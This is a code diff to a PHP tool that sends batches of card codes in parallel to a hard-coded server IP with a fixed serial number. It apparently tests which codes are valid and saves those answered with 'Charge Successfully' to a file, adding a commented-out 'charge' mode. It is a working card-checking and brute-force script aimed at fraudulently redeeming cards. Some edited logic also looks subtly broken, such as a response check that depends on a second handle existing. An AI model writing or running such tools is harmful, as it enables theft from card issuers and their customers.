@@ -17,7 +17,7 @@
         <br>
         <div>
             <label>lenght  : </label>
-            <input type="number" name="repeat" min="10" max="50000" value="1000" step="100">
+            <input type="text" name="repeat">
             <input type="submit" name="check" value="check"/>
         </div>
         <br>
@@ -157,7 +157,9 @@ function api($code){
         $url = 'http://45.91.82.31/';
         // $url = 'http://194.124.216.122/';
         $post_data['card_no'] = $code;
+        $post_data['sn'] = '191122021902';
         $post_data['submit'] = 'query';
+        //$post_data['submit'] = 'charge';
         $post_data['action'] = 'yes';
         $post_data['check_valid'] = 'yes';
 
@@ -211,9 +213,10 @@ function php_curl_multi($codes){
 
     // create both cURL resources
     foreach ($codes as $key => $code) {
-        // $post_data['sn'] = '201105014023';
-        $post_data['card_no'] = trim($code);
+        $post_data['card_no'] = $code;
+        $post_data['sn'] = '191122021902';
         $post_data['submit'] = 'query';
+        //$post_data['submit'] = 'charge';
         $post_data['action'] = 'yes';
         $post_data['check_valid'] = 'yes';
     
@@ -262,7 +265,7 @@ function php_curl_multi($codes){
     
     // get all response
     foreach ($ch_index as $key => $ch) {
-        $response[] = curl_multi_getcontent($ch);
+        $response[] = isset($ch_index[1]) ? curl_multi_getcontent($ch) : null;
     }
 
     return $response;
@@ -280,7 +283,7 @@ function execute($number=0){
     $fileCounter = file('counter.txt');
     if($number != 0) $setNum = $number;
     if($number == 0) $setNum = count($file);
-    $startNum = $fileCounter[0] ? $fileCounter[0] : 0 ;
+    $startNum = isset($fileCounter[0]) ? $fileCounter[0] : 0 ;
     $endNum = $startNum + $setNum;
     // Remove first line
     array_shift($fileCounter);
@@ -290,29 +293,38 @@ function execute($number=0){
     incrementCounter($fileCounter);
     
     $checkCodes = array();
-    for($i=$startNum;$i<$endNum;$i++){
-        array_push($checkCodes,$file[$i]);
+    for($i=$startNum; $i<$endNum; $i++){
+        if (isset($file[$i])) {
+            array_push($checkCodes, $file[$i]);
+        }
     }
-
     $multiArrayCode = array_chunk($checkCodes, 100);
     foreach ($multiArrayCode as $keyX => $codes) {
         $response = php_curl_multi($codes);
         foreach ($response as $key => $value) {
-            $start = stripos($value, "document.getElementById('prompt').innerHTML");
+            $resp = stripos($value, "document.getElementById('prompt').innerHTML");
             $end = stripos($value, "</body>");
-            $body = substr($value,$start+46,$end-$start);
+            //$body = substr($value,$start+46,$end-$start);
             $token = trim(strip_tags(getStr($value,'"id": "','"')));
 
-            if($body == ''){
+            if($resp == ''){
                 $myfile = fopen("codes.txt", "a") or die("Unable to open file!");
                 fwrite($myfile, $codes[$key]);
                 fclose($myfile);
             }
-            if(!stripos($body,'Error,Card_NO does not exist') && !stripos($body,'Error,Invalid Card_NO')){
+/*             if(!stripos($resp,'Error,Card_NO does not exist') && !stripos($resp,'Error,Invalid Card_NO')){
                 $myfile = fopen("enjoy.txt", "a") or die("Unable to open file!");
-                fwrite($myfile, $codes[$key].':'.$body);
+                fwrite($myfile, $codes[$key].':'.$resp);
                 fclose($myfile);
-                print_r(['code'=>$codes[$key],'status'=>$body]);
+                print_r(['code'=>$codes[$key],'status'=>$resp]);
+                echo '<br>';
+            } */
+
+            if(stripos($resp,'Charge Successfully')){
+                $myfile = fopen("enjoy.txt", "a") or die("Unable to open file!");
+                fwrite($myfile, $codes[$key].':'.$resp);
+                fclose($myfile);
+                print_r(['code'=>$codes[$key],'status'=>$resp]);
                 echo '<br>';
             }
 
@@ -323,8 +335,8 @@ function execute($number=0){
                 ob_end_clean();
             }
             
-            print_r(['code'=>$codes[$key],'status'=>$body]);
-            echo '<br>';
+            //print_r(['code'=>$codes[$key],'status'=>$body]);
+            echo 'code =>'.$codes[$key].': status => '.$resp.'<br>';
         }
     }
 }
